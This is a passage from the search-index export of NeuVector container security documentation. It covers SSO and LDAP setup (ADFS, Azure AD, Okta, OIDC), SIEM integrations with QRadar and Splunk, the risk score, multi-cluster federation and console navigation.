to NeuVector with Admin UserGo to SettingsClick on the button to disable and enable the SAML setting Make sure to keep the configuration settings! Once the setting has been re-enabled, you can try to log in with an ADFS user. If it works, this confirms the issue was due to a time synchronization error between Kubernetes nodes and the ADFS Server.  SAML characters must be case sensitive in NeuVector UI  Attribute names are case sensitive. Make sure any SAML attribute name configured here is an exact match to the application configuration. SAML must point to the correct URL to authenticate.  All the fields in NeuVector UI -&gt; Settings -&gt; SAML Settings are case-sensitive.  The NeuVector controller logs contain the relevant information about authentication with the ADFS server and errors that will help identify the root cause. We recommended recreate the failed login condition and check the logs.  Make sure to enter the correct groups, certificates and protocols  The SAML settings need to match the following configuration:  Setting\tValueIdentify Provider Single Sign-On URL\tRequires HTTPS protocol Identity Provider Issuer\tRequires HTTP protocol ADFS SamlResponseSignature\tNeeds to be either MessageOnly or MessageAndAssertion  attention These settings need to be validated on your ADFS server and in the NeuVector UI.  The selected certificate needs to be valid and correctly generated, including its CA Root and Intermediate Certificates. You can generate them using your trusted certificate authority, Windows or an automation tool such as LetsEncrypt.  If any of these parameters are incorrect, you will receive an Authentication Failed error when you try to log in to NeuVector with an ADFS user using SAML authentication. ","version":"Next 🚧","tagName":"h3"},{"title":"IBM QRadar","type":0,"sectionRef":"#","url":"/next/integration/ibmqr","content":"","keywords":"","version":"Next 🚧"},{"title":"Integrating with IBM Qradar​","type":1,"pageTitle":"IBM QRadar","url":"/next/integration/ibmqr#integrating-with-ibm-qradar","content":" The IBM® QRadar® Security Information and Event Management (SIEM) helps security teams accurately detect and prioritize threats across the enterprise, and it provides intelligent insights that enable teams to respond quickly to reduce the impact of incidents. By consolidating log events and network flow data from thousands of devices, endpoints and applications distributed throughout your network, QRadar correlates all this different information and aggregates related events into single alerts to accelerates incident analysis and remediation. QRadar SIEM is available on premises and in a cloud environment.  NeuVector is a full lifecycle container security platform which fully supports QRadar integration. This integration enables QRadar to be able to collect events, logs and incident information for container and Kubernetes environment. By using NeuVector’s DSM for QRadar, customers will be able to normalize the NeuVector security log data in QRadar, then analyze, report or remediate container security events.  IBM QRadar and NeuVector DSM​  The NeuVector DSM for integrating with IBM QRadar is published and IBM validated on the IBM X-Force / App Exchange website. It is available for download here from the App Exchange website.  It is also available for download from this site here  How to Integrate NeuVector with QRadar​  Before importing the NeuVector DSM into QRadar, we recommend you check/modify these QRadar configurations to make sure everything will work as expected:  IBM QRadar version 7.3.1 and laterConfigure QRadar “System Settings” to make sure the Syslog Payload Length is big enough for example:    Configure NeuVector to Send Syslog to QRadar​  Enable Syslog configuration in Settings -&gt; Configuration. The Server IP/URL and port should be pointing to the QRadar service IP and Port, and the default Syslog port will be 514. Use the UDP protocol and “In Json” log format. Select the log level and categories to report. In a multi-cluster NeuVector environment, to collect all clusters logs, this setting needs to be enabled in every cluster. You can configure the cluster name on this page to distinguish cluster events from each other.    Configure QRadar to Analyze NeuVector Logs​  Enable or Import the NeuVector DSM to QRadar When adding a new QRadar log source, if “NeuVector” appears in the QRadar log source type, then please ignore the log source importing instructions below and take the next step “Add and enable log sources for NeuVector”.    If the “NeuVector” log source type was not found in QRadar, please refer to QRadar user manual to install NeuVector DSM via Admin &gt; Extension Management.    Add and enable log sources for NeuVector  Now we can add a new log source for NeuVector logs:    “Log Source Identifier” should be the lead controller’s pod name. NeuVector’s lead controller’s pod name can be found in the raw log data of QRadar or from NeuVector’s management console “Assets\\Controllers” as below:    Multiple log sources should be added if there are multiple NeuVector clusters running. NeuVector log source is added and enabled:    Verify the Log Activities​  Generate some NeuVector logs, for example Network Policy Violations, Configuration change events or do some Vulnerability Scans on containers/nodes. These incident or event logs will be sent to QRadar in seconds. And the NeuVector logs should be normalized in QRadar console. It can also be verified through QRadar’s DSM editor:      Integration Summary​  With the completed integration, NeuVector security and management events can be managed through QRadar together with event data from other sources. QRadar serves as the permanent event storage for NeuVector events, while the NeuVector controller performs real-time security responses and short-term cluster storage for events. QRadar can perform advanced correlation and alerting for critical container and Kubernetes security events. ","version":"Next 🚧","tagName":"h3"},{"title":"LDAP","type":0,"sectionRef":"#","url":"/next/integration/ldap","content":"","keywords":"","version":"Next 🚧"},{"title":"LDAP​","type":1,"pageTitle":"LDAP","url":"/next/integration/ldap#ldap","content":" Configure the required fields to connect to your LDAP server.    Port. The default port is 389 for SSL disabled and 636 for SSL enabled.User name (optional). We use this admin user name to bind the ldap server for each query.Base dn. This should be a root node in ldap server to search for the ldap user and group.Default role. This is the role that a user will take if role group mapping (below) fails. If the user’s group attribute is found that can be mapped to a role, then the default role will not be used. If no matching group attribute is found, the default role will be taken. If the default role is None in this case, the user login will fail. The ‘test connection’ button will check if a username/password can be authenticated by the configured LDAP server.Admin and Reader role map. This defines how to map a user’s LDAP group membership to the user role in NeuVector. Add the LDAP group list to the corresponding roles. When looking up a user’s group membership in LDAP schema, we assume the group’s member attribute is named as “memberUid”.  Mapping Groups to Roles and Namespaces​  Please see the Users and Roles section for how to map groups to preset and custom roles as well as namespaces in NeuVector. ","version":"Next 🚧","tagName":"h3"},{"title":"Microsoft AD","type":0,"sectionRef":"#","url":"/next/integration/msad","content":"","keywords":"","version":"Next 🚧"},{"title":"Configuring Active Directory​","type":1,"pageTitle":"Microsoft AD","url":"/next/integration/msad#configuring-active-directory","content":" This explains how NeuVector authenticates with Windows Active Directory. The configuration page for Windows Active Directory server is shown below.    User name: This can be any user who has read permission on the Base DN object. The dn attribute should be used as shown below, or the windows logon name such as user@local.nvtest.com.    Base DN: This is a root Windows Active Director object for user authentication. The minimum access permission requirement is read. As shown in the example above, the OU=IT,DC=local,DC=nvtest,DC=com object is only allowed for a user account which is defined in the User name field to allow a read.    With the above User name and Base DN settings, NeuVector is able to bind with Windows Active Directory successfully. Click the TEST CONNECTION to check it.    User name: It is required to use the sAMAccountName attribute ONLY to match. For example, in the screen below NeuVector is going to verify if the ituser(CN=ituser,OU=IT,DC=local,DC=nvtest,DC=com) user is able to login with NeuVector web console.  note NeuVector doesn't use the values of cn, displayName, dn, givenName, name or userPrincipalName attributes etc to verify the test user.    The last part is role mapping for NeuVector for the web console login.    In the example above, the defined group, _d_s_itgroup, in the NeuVector role must have member and sAMAccountType attributes. The value of the sAMAccountType attribute MUST be 268435456 which is the Global Security group and the login username must be in the member lists.    Group member attribute: This is a member attribute for Windows Active Directory by default and it is used for the role mapping purpose, as shown above. If all the requirements are met above, the Windows Active Directory user should be able to login to the NeuVector web console successfully.  Mapping Groups to Roles and Namespaces​  Please see the Users and Roles section for how to map groups to preset and custom roles as well as namespaces in NeuVector. ","version":"Next 🚧","tagName":"h3"},{"title":"SAML (Azure AD)","type":0,"sectionRef":"#","url":"/next/integration/msazure","content":"","keywords":"","version":"Next 🚧"},{"title":"Integrate with Azure AD SAML authentication​","type":1,"pageTitle":"SAML (Azure AD)","url":"/next/integration/msazure#integrate-with-azure-ad-saml-authentication","content":" In the Azure management console, select the ”Enterprise applications&quot; menu item in Azure Active Directory    Select “New Application”    Create a Non-gallery application and give it a unique name    In the application's configuration page, select &quot;Single sign-on&quot; in the left-side panel and choose the SAML-based sign-on    Download the certificate in the base64 format and note the application's Login URL and Azure AD Identifier    In the NeuVector management console, login as an administrator. Select “Settings&quot; in the administrator dropdown menu at the top-right corner. Click SAML settings    Configure the SAML server as follows:  Copy application's &quot;Login URL&quot; as the Single Sign-On URL.Copy &quot;Azure AD Identifier&quot; as the Issuer.Open downloaded the certificate and copy the text to X.509 Certificate box.Set a default role.Enter the group name for role mapping. The group claim returned by Azure are identified by the &quot;Object ID&quot; instead of the name. The group's object ID can be located in Azure Active Directory &gt; Groups &gt; Group name Page. You should use this value to configure group-based role mapping in NeuVector.    Then Enable the SAML server.    Copy the Redirect URL    Return to the Azure management console to setup &quot;Basic SAML Configuration&quot;. Copy NeuVector console's Redirect URL to both &quot;Identifier&quot; and &quot;Reply URL&quot; boxes    Edit &quot;SAML Signing Certificate&quot;, changing the Signing Option to &quot;Sign SAML response&quot;    Edit &quot;User Attributes &amp; Claims&quot; so the response can carry the login user's attributes back to NeuVector. Click &quot;Add new claim&quot; to add &quot;Username&quot; and &quot;Email&quot; claims with &quot;user.userprincipalname&quot; and &quot;user.mail&quot; respectively.    If the users are assigned to the groups in the active directory, their group membership can be added to the claim. Find the application in &quot;App registrations&quot; and edit the manifest. Modify the value of &quot;groupMembershipClaims&quot; to &quot;All&quot;.    Authorize users and groups to access the application so they can login NeuVector console with Azure AD SAML SSO    Mapping Groups to Roles and Namespaces​  Please see the Users and Roles section for how to map groups to preset and custom roles as well as namespaces in NeuVector. ","version":"Next 🚧","tagName":"h3"},{"title":"OpenID Connect (OIDC) for ADFS","type":0,"sectionRef":"#","url":"/next/integration/oidc_adfs","content":"","keywords":"","version":"Next 🚧"},{"title":"Integrating with OpenID Connect (OIDC) for ADFS​","type":1,"pageTitle":"OpenID Connect (OIDC) for ADFS","url":"/next/integration/oidc_adfs#integrating-with-openid-connect-oidc-for-adfs","content":" From AD FS Management, click on &quot;Application Groups&quot; and then click on &quot;Add Application Group...&quot;    Enter a name, select &quot;Server application accessing a web API&quot; and then click Next    Enter Redirect URI from NeuVector Settings &gt; OpenID Connect Setting page and then click Next    Enable &quot;Generate a shared secret&quot; checkbox and then click Next    Enter the Identifier created in previous step and then click Next      Enable allatclaims, email, openid and profile scopes and then click Next        Double click on an application group you just created previously    Double click on Web API and then click Issuance Transform Rules tab    Click Add Rule... and select &quot;Send LDAP Attributes as Claims&quot; and then click Next    Enter a Claim rule name, choose Active Directory as the Attribute store and provide the mapping of LDAP attributes to outgoing claim types as below  Token-Groups – Unqualified Names -&gt; groupsUser-Principal-Name -&gt; preferred_usernameE-Mail-Address -&gt; email      NeuVector Setup​  Identity Provider Issuer: https://&lt;adfs-fqdn&gt;/adfsClient ID: It is a &quot;Client Identifier&quot; showing in &quot;Server application&quot; dialog in &quot;Add Application Group Wizard&quot;Client Secret: It is a Secret showing in &quot;Configure Application Credentials&quot; dialog in &quot;Add Application Group Wizard&quot;Group Claim: groups       ","version":"Next 🚧","tagName":"h3"},{"title":"SAML (Okta)","type":0,"sectionRef":"#","url":"/next/integration/saml","content":"","keywords":"","version":"Next 🚧"},{"title":"SAML IDP Configuration​","type":1,"pageTitle":"SAML (Okta)","url":"/next/integration/saml#saml-idp-configuration","content":" To configure NeuVector to use Okta SAML IDP server, first, configure the SAML IDP server on the Okta site.    Copy &quot;SAML Redirect URI&quot; from NeuVector SAML Setting page, paste it to Okta's single sign on url, recipient url and destination url fields.Assertion encryption: This field must be unencrypted.Attribute statements: Enter the email and username attributes.Group attribute statements: Enable this if group-based role mapping is required. The default attribute name that NeuVector looks for is NVRoleGroup. If other attribute name is used for the user's group membership, it can be customized in NeuVector's SAML Setting page.  Configure SAML settings in NeuVector UI console.    Use &quot;View Setup Instructions&quot; button as shown in the following screenshot to locate following information, and copy them into NeuVector's SAML page.  Identity Provider Single Sign-On URLIdentity Provider IssuerX.509 CertificateSpecify group attribute name if non-default value is used.    After the user is authenticated, the proper role can be derived with group-based role mapping configuration. To setup group-based role mapping,  If group-based role mapping is not configured or the matched groups cannot be located, the authenticated user will be assigned with the Default role. If the Default role is set to None, when group-based role mapping fails, the user is not able to login.Specify a list of groups respectively in Admin and Reader role map. The user's group attribute is piggybacked in the response after the user is authenticated. If the matched group is located, the corresponding role will be assigned to the user.  Mapping Groups to Roles and Namespaces​  Please see the Users and Roles section for how to map groups to preset and custom roles as well as namespaces in NeuVector. ","version":"Next 🚧","tagName":"h3"},{"title":"OpenID Connect Azure/Okta","type":0,"sectionRef":"#","url":"/next/integration/openid","content":"","keywords":"","version":"Next 🚧"},{"title":"Integrating with OpenID Connect (OIDC) for Azure and Okta​","type":1,"pageTitle":"OpenID Connect Azure/Okta","url":"/next/integration/openid#integrating-with-openid-connect-oidc-for-azure-and-okta","content":" To enable OpenID Connect authentication, the Issuer, Client ID and Client secret settings are required. With the issuer URL, NeuVector will call the discovery API to retrieve the Authenorization, Token and User info endpoints.  Locate the OpenID Connect Redirect URI on the top of the NeuVector OpenID Connect Setting page. You will need copy this URI to the Login redirect URIs for Okta and Reply URLs for Microsoft Azure.    Microsoft Azure Configuration​  In Azure Active Directory &gt; App registrations &gt; Application name &gt; Settings Page, locate Application ID string. This is used to set the Client ID in NeuVector. The Client secret can be located in Azure's Keys setting.    The Issuer URL takes https://login.microsoftonline.com/{tenantID}/v2.0 format. To locate the tenantID, go to Azure Active Directory &gt; Properties Page and found the Directory ID, replace it with the tenantID in the URL    If the users are assigned to the groups in the active directory, their group membership can be added to the claim. Find the application in Azure Active Directory -&gt; App registrations and edit the manifest. Modify value of &quot;groupMembershipClaims&quot; to &quot;Application Group&quot;. There is a maximum number of groups that will get emitted into a token. If the user belongs to a large number of groups ( &gt; 200) and the value &quot;All&quot; is used, the token will not include the groups and authorization will failed. Using the value &quot;Application Group&quot; instead of &quot;All&quot; will reduce the number of applicable groups returned in the token.  By default, NeuVector looks for &quot;groups&quot; in the claim to identify the user's group membership. If other claim name is used, you can customize the claim name in NeuVector's OpenID Connect Setting page.  The group claim returned by Azure are identified by the &quot;Object ID&quot; instead of the name. The group's object ID can be located in Azure Active Directory &gt; Groups &gt; Group name Page. You should use this value to configure group-based role mapping in NeuVector -&gt; Settings.    Verify Permissions  Make sure the following permissions have been set from Microsoft Graph  email - View users' email addressopenid - Sign users inprofile - View users' basic profile  Okta Configuration​  Login to your Okta account.  On the lefthand side menu, click “Applications -&gt; Applications“ In the center pane, click “Create App Integration”:    A new pane will pop up to select the “Sign-in method”:    Select “OIDC – OpenID Connect” option.  A derived pane will appear, for “Application Type” selection:    Select “Native Application” option.  The central pane will now show the Native App Integration form where you have to fill in accordingly the following values:  For General Settings section:  App. Integration Name: Name for this integration. Freely choose any name Grant Type (check):  Authorization CodeRefresh TokenResource Owner PasswordImplicit (hybrid)  For Sign-in redirect URIs section:  Go to your NeuVector console and navigate to “Settings” -&gt; “OpenId Connect Settings”. At the top of the page, next to “OpenID Connect Redirect URI” label click “Copy to Clipboard”.    This will copy to the redirect URI to memory. Paste it in its corresponding textbox:    For Assignments section:  Select “Allow everyone in your organization to access” to have this integration available for everyone in your org.    Then click the save button at the bottom of the page.  Once your general setting are saved, you will be taken to your new application integration setup and a client Id will be generated automatically.  In “Client Credentials” section, click edit and modify the “Client Authentication” section from “Use PKCE (for public clients)” to “Use Client Authentication”, and hit save. This will generate a new secret automatically which we will need in upcoming NeuVector setup steps:    Navigate to the “Sign On” tab and edit the “OpenID Connect ID Token” section: Change the Issuer from “Dynamic (based on request domain)” to the fixed “Okta URL”:    The Okta console can operate in two modes, Classic Mode and Developer Mode. In classic mode, the issuer URL is located at Okta Application page's Sign On Tab. To have the user's group membership returned in the claim, you need to add &quot;groups&quot; scope in the NeuVector OpenID Connect configuration page:    In the Developer Mode, Okta allows you to customize the claims. This is done in the API page by managing Authorization Servers (navigate to left hand menu -&gt; Security -&gt; API). The issuer URL is located in each authorization server's Settings tab:    Claims are name/value pairs that contain information about a user as well as meta-information about the OIDC service. In “OpenID Connect ID Token” section, you can create new claims for user's Groups and carry the claim in the ID Token (an ID Token is a JSON Web Token, a compact URL-Safe means of representing claims to be transferred between two parties, so identity information about the user is encoded right into the token and the token can be definitively verified to prove that is hasn’t been tampered with). If a specific scope is configured, make sure to add the scope to NeuVector OpenID Connect setting page, so that the claim can be included after the user is authenticated:    By default, NeuVector looks for &quot;groups&quot; in the claim to identify the user's group membership. If other claim name is used, you can customize the claim name in NeuVector's OpenID Connect Setting page. To configure claims, edit the “OpenID Connect ID Token” section as shown in the next image:    In your application integration page, navigate to “Assignments” tab and make sure you have the corresponding assignments listed:    NeuVector OpenID Connect Configuration​  Configure the proper Issuer URL, Client ID and Client secret in the page.    After the user is authenticated, the proper role can be derived with group-based role mapping configuration. To setup group-based role mapping,  If group-based role mapping is not configured or the matched groups cannot be located, the authenticated user will be assigned with the Default role. If the Default role is set to None, when group-based role mapping fails, the user is not able to login.Specify a list of groups respectively in Admin and Reader role map. The user's group membership is returned by the claims in the ID Token after the user is authenticated. If the matched group is located, the corresponding role will be assigned to the user.  The group can be mapped to the Admin role in NeuVector. Individual users can be 'promoted' to a Federated Admin role by logging in as a local cluster admin, selecting the user with Identify Provider 'OpenID', and editing their role in Settings -&gt; Users/Roles.  Mapping Groups to Roles and Namespaces​  Please see the Users and Roles section for how to map groups to preset and custom roles as well as namespaces in NeuVector. ","version":"Next 🚧","tagName":"h3"},{"title":"Splunk","type":0,"sectionRef":"#","url":"/next/integration/splunk","content":"","keywords":"","version":"Next 🚧"},{"title":"Integrating with Splunk with the NeuVector Splunk App​","type":1,"pageTitle":"Splunk","url":"/next/integration/splunk#integrating-with-splunk-with-the-neuvector-splunk-app","content":" The NeuVector Splunk App can be found in the splunkbase catalog here or by searching for NeuVector.  The NeuVector Security dashboard helps to identify security events such as suspicious login attempts, network violations and vulnerable images.  Below are sample screens displayed in the Splunk app.  Image Vulnerabilities​    Admission Control and Security Events​    Network Violations by Pod/Service (Deployments)​    Egress Connection Summary​    NeuVector Login Activity Dashboard​    ","version":"Next 🚧","tagName":"h3"},{"title":"Setup and Configuration​","type":1,"pageTitle":"Splunk","url":"/next/integration/splunk#setup-and-configuration","content":" Getting the app​  GitHub​  Download the latest app tarball (neuvector_app.tar.gz) from the neuvector/neuvector-splunk-app repository.  Splunkbase​  Download the latest app tarball from Splunkbase.  Splunk Apps Browser​  In the Splunk UI, click on the Apps dropdown, click &quot;Find More Apps&quot;, then search for NeuVector Splunk App.  Installation and Setup​  Install the app by either uploading the tarball or following the Splunkbase prompts.  Configure syslog in NeuVector console  Go to Settings -&gt; Configuration -&gt; Syslog  a. set the server value as the IP address that Splunk is running b. choose TCP as the protocol; c. set port number as 10514; d. choose Info Level; e. click SUBMIT to save the setting.    You can configure multiple clusters to send syslog to your splunk instance and your splunk instance will receive these syslogs in real time.  FAQs​  What user role is required?​  Any user role. ","version":"Next 🚧","tagName":"h3"},{"title":"Navigating NeuVector","type":0,"sectionRef":"#","url":"/next/navigation","content":"Navigating NeuVector Console Menu and Navigation","keywords":"","version":"Next 🚧"},{"title":"Improve Security Risk Score","type":0,"sectionRef":"#","url":"/next/navigation/improve_score","content":"","keywords":"","version":"Next 🚧"},{"title":"Improving the Security Risk Score​","type":1,"pageTitle":"Improve Security Risk Score","url":"/next/navigation/improve_score#improving-the-security-risk-score","content":" The Security Risk Score in the Dashboard provides a score between 0 and 100.  0-20 Good21-50 Fair51-100 Poor  The score is the sum of following metrics, each shown as a maximum value, with a max 100:  NeuVector Protection Mode - 30Ingress/Egress Risk - 42Privileged Containers - 4Root Containers - 4Admission Controls - 4Vulnerabilities - 16 (Containers - 8, Host - 6, orchestrator Platform - 2)  By default, NeuVector includes all containers, including system containers, in the risk score. This can be customized for each learned container Group to disable certain containers from being included in the risk score calculation, as shown below.  How to Improve the Score​  NeuVector Protection Mode​  Change the New Service Protection Mode in Settings -&gt; Configuration to Monitor or ProtectChange all ‘learned’ Groups in Policy -&gt; Groups to Monitor or Protect  Or  Click the Tool icon to follow the Wizard to perform the above steps  Ingress/Egress Risk​  Click the Tool icon to follow the Wizard to review Ingress and EgressReview all Ingress and Egress Connections to make sure they should be allowedSwitch all services that are still in Discover mode to Monitor or ProtectReview and Clear all threats, violations and session history by clicking the Delete/Trash icon for each one  Privileged and/or Root Containers​  Remove privileged containersRemove Root Containers Note: This may not be possible due to your required containers, however each of these only account for 4 points.  Admission Controls​  Make sure that, in a Kubernetes/OpenShift environment, Admission Control is enabled and there is at least one active rule in Policy -&gt; Admission Control  Vulnerabilities​  Make sure all non-system containers are in Monitor or Protect mode, in Policy -&gt; GroupsRemove/remediate host vulnerabilitiesRemove/remediate orchestrator platform (e.g. Kubernetes, OpenShift) vulnerabilities  How to Customize Which Container Groups Are Included in the Score​  To enable or disable which container Groups are included in the Security Risk Score, go to the Policy -&gt; Groups menu, and select the Group to modify. The summary column on the right has a 'Scorable' icon which indicates which groups are used for scoring.    Select or deselect the Scorable check box in the upper right for the selected Group.  note Only 'learned Groups' (e.g. those that begin with 'nv.') can be edited, not reserved groups or custom groups. ","version":"Next 🚧","tagName":"h3"},{"title":"Security Policy & Rules","type":0,"sectionRef":"#","url":"/next/policy","content":"Security Policy &amp; Rules Manage network, process, and file system rules. Discover, Monitor, Protect Modes enable learning of normal application behavior and detection of violations.","keywords":"","version":"Next 🚧"},{"title":"Configuration Assessment for Kubernetes Resources","type":0,"sectionRef":"#","url":"/next/policy/admission/assessment","content":"","keywords":"","version":"Next 🚧"},{"title":"Kubernetes Resource Deployment File Scanning​","type":1,"pageTitle":"Configuration Assessment for Kubernetes Resources","url":"/next/policy/admission/assessment#kubernetes-resource-deployment-file-scanning","content":" NeuVector is able to scan deployment yaml files for configuration assessments against Admission Control rules. This is useful to scan deployment yaml files early in the pipeline to determine if the deployment would violate any rules before attempting the deployment.  To upload a yaml file to be scanned, go to Policy -&gt; Admission Control and click the Configuration Assessment button. In the window, select a file to upload, then Test.    You will then see an analysis of the file, whether the deployment would be allowed, and messages for rules that would apply to the deployment file. ","version":"Next 🚧","tagName":"h3"},{"title":"Enterprise Multi-Cluster Management","type":0,"sectionRef":"#","url":"/next/navigation/multicluster","content":"","keywords":"","version":"Next 🚧"},{"title":"Enterprise Console​","type":1,"pageTitle":"Enterprise Multi-Cluster Management","url":"/next/navigation/multicluster#enterprise-console","content":" The NeuVector console can be used to manage large enterprise multi-cluster and multi-cloud deployments. One cluster should be selected as the Primary cluster, and other Remote clusters will then be able to join the Primary. Once connected, the Primary cluster can push Federated rules down to each remote cluster, which display as Federated rules in the consoles of each remote cluster. Scanned Federated registries will also sync the scan results with remote clusters. Only local users &amp; Rancher users who have admin permission can promote a cluster to become the primary cluster.  In addition to Federated policy, multi-cluster management supports monitoring of each remote cluster in a summary page, as shown below.    There MUST be network connectivity between the controllers in each cluster on the required ports. The controller is exposed external to its cluster by either a primary or remote service, as can be seen in the sample NeuVector deployment yaml file.  ","version":"Next 🚧","tagName":"h3"},{"title":"Configuring the Primary and Remote Clusters​","type":1,"pageTitle":"Enterprise Multi-Cluster Management","url":"/next/navigation/multicluster#configuring-the-primary-and-remote-clusters","content":" Log into the console for the cluster which will be the Primary cluster. In the upper right drop down menu, select Multiple Clusters and then Promote to configure the Primary. Note: Only local users &amp; Rancher users who have admin permission can promote a cluster to become the primary cluster. Currently, SSO/LDAP/OIDC users with admin role are not allowed to promote a cluster to primary.  Enter the public IP and port of the fed-master service. You can find this by running  kubectl get svc -n neuvector   The output will look like:  NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE neuvector-service-controller-fed-master LoadBalancer 10.27.249.147 35.238.131.23 11443:31878/TCP 17d neuvector-service-controller-fed-worker LoadBalancer 10.27.251.1 35.226.199.111 10443:32736/TCP 17d   In the above example the primary controller host name/IP is 35.238.131.23 and the port is 11443. Note: Make sure this IP address and port are externally accessible (from the remote clusters). Note: The system clocks (time) must be the same for each primary and remote cluster in order to function properly.  After logging back into the console, select Multiple Clusters again from the upper right menu, and click on the icon to generate a token needed to connect the remote clusters. Copy the token for use in the next step. The token is valid for about 1 hour, and if expired must be generated again to connect future remote clusters.    To join a remote cluster to the primary, login to the remote cluster console as an admin. Select Multiple Clusters from the upper right drop down, and click on Join. Enter the controller IP or host name for the remote cluster as well as the port. Again, you can retrieve this information from the remote cluster by doing:  kubectl get svc -n neuvector   Use the output for the fed-worker of the remote cluster to configure the IP address and port. Then enter the token copied from the primary. Note that after entering the token, the IP address and port for the primary will be automatically filled in, but this can be edited or manually entered.    Log out of the remote cluster and log back into the primary. Or if already logged in, click refresh and the remote cluster will be listed in the Multiple Clusters menu.    You can click on the manage icon in the list, or use the pull down multi-cluster menu at the top to switch clusters at any time. Once you have switched to a remote cluster, all menu items on the left now apply to the remote cluster.  ","version":"Next 🚧","tagName":"h3"},{"title":"Troubleshooting​","type":1,"pageTitle":"Enterprise Multi-Cluster Management","url":"/next/navigation/multicluster#troubleshooting","content":" To ensure the services are responding as expected, you can run the tests from outside the clusters, or, if needed, from the test pods on fed-master and fed-managed clusters to ensure network connection is allowed between the clusters.  Verify fed-master service​  The cluster service port 11443 is only accessible after enabling the fed-master service. The command below returns an error code when the fed-master service responds to indicate the requested resource is unavailable.  Output example {&quot;code&quot;:1,&quot;error&quot;:&quot;URL not found&quot;,&quot;message&quot;:&quot;URL not found&quot;}   info The URL for the curl command depends on how the fed-master services is exposed. If an ingress service is configured, it's not neccessary to specify a port.  curl -v https://&lt;fed-master&gt;[:&lt;port&gt;]/v1/eula   Verify fed-managed service​  The cluster service port 10443 is shared between REST API and the fed-managed service. The command below returns a success code when the fed-managed service responds to indicate it's available.  Output example {&quot;eula&quot;:{&quot;accepted&quot;:true}})   info The URL for the curl command depends on how the fed-managed services is exposed. If an ingress service is configured, it's not neccessary to specify a port.  curl -v https://&lt;fed-managed&gt;[:&lt;port&gt;]/v1/eula   ","version":"Next 🚧","tagName":"h3"},{"title":"Federated Policy​","type":1,"pageTitle":"Enterprise Multi-Cluster Management","url":"/next/navigation/multicluster#federated-policy","content":" Please see the Policy -&gt; Federated Policy section for instructions on how to create Federated rules that will be pushed to each cluster.  ","version":"Next 🚧","tagName":"h3"},{"title":"Federated Registries for Distributed Image Scanning Results​","type":1,"pageTitle":"Enterprise Multi-Cluster Management","url":"/next/navigation/multicluster#federated-registries-for-distributed-image-scanning-results","content":" The primary (master) cluster can scan a registry/repo designated as a federated registry. The scan results from these registries will be synchronized to all managed (remote) clusters. This enables display of scan results in the managed cluster console as well as use of the results in admission control rules of the managed cluster. Registries only need to be scanned once instead of by each cluster, reducing CPU/memory and network bandwidth usage.  Federated registries can only be configured by a federated admin on the primary cluster in Assets -&gt; Registries. After adding and scanning a federated repository, the scan results will be synchronized to all managed clusters. Admission control rules in each managed cluster which require image scanning (e.g. CVE, compliance based rules) will automatically use both federated scan results as well as any registry scans results locally configured.  Federating Results from CI/CD Scanners (Optional)​  Federated registry scan results are always sync'd to managed clusters, as described above. The primary cluster can also receive scan results from stand alone scanner scans or scanner plug-ins invoked from a build CI/CD pipeline. To enable build phase (CI/CD) repository scanning results to also sync to managed clusters, first enable it by editing the primary (master) cluster settings as shown below.   ","version":"Next 🚧","tagName":"h3"},{"title":"Navigating the Console","type":0,"sectionRef":"#","url":"/next/navigation/navigation","content":"","keywords":"","version":"Next 🚧"},{"title":"Console Access​","type":1,"pageTitle":"Navigating the Console","url":"/next/navigation/navigation#console-access","content":" The default user and password are admin.  Please see the first section Basics -&gt; Connect to Manager for configuration options such as turning off https, accessing the console through a corporate firewall which does not allow port 8443, or replacing the self-signed certificate.  ","version":"Next 🚧","tagName":"h3"},{"title":"Menus and Navigation​","type":1,"pageTitle":"Navigating the Console","url":"/next/navigation/navigation#menus-and-navigation","content":" Use the left side menu to navigate in your NeuVector console. Note that there are additional settings in upper right for User Profile and Multi-Cluster configuration.  Dashboard​  The Dashboard shows a summary of risk scores, security events, and application protocols detected by NeuVector. It also shows details for some of these security events. PDF reports can be generated from the Dashboard which contain detailed charts and explanations.  At the top of the dashboard there is a summary of the security risks in the cluster. The wrench tool next to the overall risk score can be clicked to open a wizard which will guide you through recommended steps to reduce/improve the risk score. Mousing over each risk gauge will provide a description of it to the right and how to improve the risk score. Also see the separate documentation section Improving Security Risk Score.    Overall Security Risk Score. This is a weighted summary of the individual risk areas summarized to the right, including Service exposure, Ingress/Egress exposure, and Vulnerability exploit risks. Click on the wrench to improve the score.Service Exposure Risk Score. This is an indicator of how many services are protected by whitelist rules and running in the Monitor or Protect mode, where risk is lowest. A high ratio of services in Discover mode means these services are not segmented or isolated by whitelist rules.Ingress/Egress Risk Score. This is a weighted summary of actual threats or network violations detected on ingress or egress (out of the cluster) connections, combined with allowed ingress/egress connections. External connections which are protected by whitelist rules have lower risk but can still be attacked by embedded network attacks. Note: A list of ingress and egress IPs can be downloaded from the Ingress/Egress details section as an Exposure Report.Vulnerability Exploit Risk Score. This is the risk of exploits of vulnerabilities in running containers. Services in Discover mode with High criticality vulnerabilities will have the highest impact on the score, as they are highest risk. If services are in Monitor or Protect but still have High vulnerabilities, they are protected by network and process rules to identify (and block) suspicious activity, so will have a lower weighting on the score. A warning will be shown if the Auto-Scan button is not enabled for automatic run-time scanning.  Some of the charts are interactive, as shown below with the green arrows.    Some of the event data shown in the dashboard have limits, as described in the Reporting section.  Application Protocols Detected This chart summarizes the application protocols detected in live connections in the cluster. The category ‘Other’ means any unrecognized HTTP protocols or raw TCP connections. You can toggle between the Application Coverage and the Application Volume levels.  Application Coverage is the number of unique pod to pod conversations detected between application services. For example if service pod A connects to service pod B using HTTP that is one unique HTTP ‘conversation’, but all connections between A and B count as one conversation.Application Volume is the network activity measured in Gbytes for all services using that protocol.  Network Activity​  This provides a graphical map of your containers and the conversations between containers. It also shows connections with other local and external resources. In Monitor and Protect modes, violations are displayed with red or yellow lines to indicate that a violation has been detected.  note If a large number of containers or services are present, the view will automatically default to a namespace view (collapsed). Double click on a namespace icon to expand it.  note This display uses a local GPU if available to speed loading times. Some Windows GPUs have known issues, and the use of the GPU can be turned off in Advanced Filter window (see below for Tools).  Some of the actions possible are:  Move objects around to better view services and conversationsClick on any line (arrow) to see more detail such as protocol/port, latest time stamp, and to add or edit a rule (NOTE: both connection endpoints must be fully expanded by double clicking on each in order to see the connection details)Click on any container to see details, and the ‘i’ for real-time connections. You can also quarantine a node from here. Right click on a container to perform actions.Filter view by protocol, or search by namespace, group, container (upper right). You can add multiple filters to the selection box.Refresh the map to show latest conversationsZoom in/out to switch between a logical view (all containers collapsed into a service group) or physical view (all containers for the same service displayed)Toggle on/off the display of orchestration components such as load balancers (e.g. built in for Kubernetes or Swarm)(Service Mesh Icon) Double click to expand 